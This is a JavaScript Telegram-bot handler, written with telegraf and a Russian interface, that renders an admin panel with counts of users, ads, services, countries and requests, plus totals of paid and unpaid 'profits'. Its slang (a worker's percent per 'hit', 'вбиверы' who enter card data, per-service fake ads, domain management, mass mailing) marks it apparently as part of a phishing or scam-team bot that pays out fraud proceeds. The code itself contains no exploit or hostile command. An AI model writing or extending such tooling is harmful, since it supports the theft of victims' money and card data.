const { Markup } = require("telegraf");
const {
  User,
  Service,
  Country,
  Request,
  Settings,
  Profit,
  Ad,
} = require("../../database");

module.exports = async (ctx) => {
  try {
    const stats = {
      users: await User.count(),
      services: await Service.count(),
      countries: await Country.count(),
      profits: await Profit.count(),
      profits_sum: await Profit.sum("amount"),
      profits_not_payed_sum: await Profit.sum("amount", {
        where: {
          status: 0,
        },
      }),
      profits_payed_sum: await Profit.sum("amount", {
        where: {
          status: 1,
        },
      }),
      ads: await Ad.count(),
      requests: await Request.count(),
      requests_in_process: await Request.count({
        where: {
          status: 0,
        },
      }),
      requests_accepted: await Request.count({
        where: {
          status: 1,
        },
      }),
      requests_declined: await Request.count({
        where: {
          status: 2,
        },
      }),
    };

    if (ctx.state.user.status == 1) {
      // await ctx.deleteMessage().catch((err) => err);

      return ctx
        .replyOrEdit(
          `<b>🖥️ Панель администратора </b>
    
Пользователей: <b>${stats.users}</b>
Сервисов: <b>${stats.services}</b>
Стран: <b>${stats.countries}</b>
Профитов: <b>${stats.profits}</b>
Объявлений: <b>${stats.ads}</b>
Заявок: <b>${stats.requests}</b>
Заявок на рассмотрении: <b>${stats.requests_in_process}</b>
Принятых заявок: <b>${stats.requests_accepted}</b>
Отклонённых заявок: <b>${stats.requests_declined}</b>

Сумма невыплаченных профитов: <b>${stats.profits_not_payed_sum} USD</b>
Сумма выплаченных профитов: <b>${stats.profits_payed_sum} USD</b>

Процент воркера с залёта: <b>${ctx.state.bot.payoutPercent}%</b>
`,
{
  parse_mode: "HTML",
  reply_markup: Markup.inlineKeyboard([
    // 🌐 Инфраструктура
    [     
      //  Markup.callbackButton("🍪 Cookie", "admin_cookie"),

      Markup.callbackButton("🔗 Домены", "admin_domains"),
    ],

    // 📂 Коммуникация и пользователи
    [
      Markup.callbackButton("✉️ Рассылка", "admin_send_mail"),
      Markup.callbackButton("👥 Пользователи", "admin_users_1"),
    ],

    // 👤 Команда
    [
      Markup.callbackButton("👨🏼‍💻 Операторы", "admin_operators"),
      Markup.callbackButton("🎓 Наставники", "admin_mentors"),
      Markup.callbackButton("✍️ Вбиверы", "admin_writers_1"),
    ],

    // 📦 Контент и данные
    [
      Markup.callbackButton("📂 Объявления", "admin_ads_1"),
      Markup.callbackButton("📦 Сервисы", "admin_services_1"),
      Markup.callbackButton("🌎 Страны", "admin_countries_1"),
    ],

    // 💰 Финансы и заявки
    [
      Markup.callbackButton("💸 Профиты", "admin_profits_1"),
      Markup.callbackButton("📝 Заявки", "admin_requests_1"),
    ],

    // ⚙️ Система
    [
      Markup.callbackButton("⚙️ Настройки", "admin_settings"),
      Markup.callbackButton("🧹 Чистка БД", "admin_clean_db"),
      Markup.callbackButton("🆘 Помощь", "admin_help"),
    ],

    // 🚪 Закрытие/возврат
    [
      ctx.updateType === "callback_query"
        ? Markup.callbackButton("◀️ Вернуться в меню", "start")
        : Markup.callbackButton("❌ Закрыть", "delete"),
    ],
  ]),
}
        )

        .catch((err) => err);
    } else {
    }
  } catch (err) {
    return ctx.reply("❌ Ошибка").catch((err) => err);
  }
};
